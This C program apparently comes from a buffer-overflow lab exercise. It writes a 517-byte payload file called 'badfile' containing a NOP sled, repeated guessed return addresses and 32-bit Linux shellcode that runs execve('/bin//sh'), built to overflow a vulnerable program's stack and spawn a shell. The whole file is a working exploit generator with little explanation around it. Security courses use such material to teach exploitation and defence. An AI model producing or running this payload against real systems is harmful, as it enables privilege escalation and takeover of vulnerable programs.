#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] = 
    "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80"
;

//-------Get approximate stack pointer---------------
unsigned long get_stack_ptr() 
{
    int p;
    return (unsigned long*)&p;
}
int main(int argc, char **argv) 
{
    char buffer[517];
    FILE *badfile;

    /* initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    int codeLen = sizeof(shellcode);
    int buffLen = sizeof(buffer);
    int i;
    long *addr = (long*)(buffer);

    long retAddress = get_stack_ptr() + 150; //approximated return address location through trial and error
    
    int pos = buffLen - (codeLen + 1);
	
	/* fill the end of buffer with shellcode, so it can be towards the top of the stack */
    for (i = pos; i <= codeLen + pos; i++) {
        buffer[i] = shellcode[i - pos];
    }
 
	/* fill the beginning of buffer with desired return address, so it can overflow into 
	the stack's return address value */
    for (i = 0; i < 13; i++) 
    {
		*(addr++) = retAddress;
    }

    buffer[516] = '\0';   
    
    /*save contents to the file "badfile"*/
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
    return 1;
}
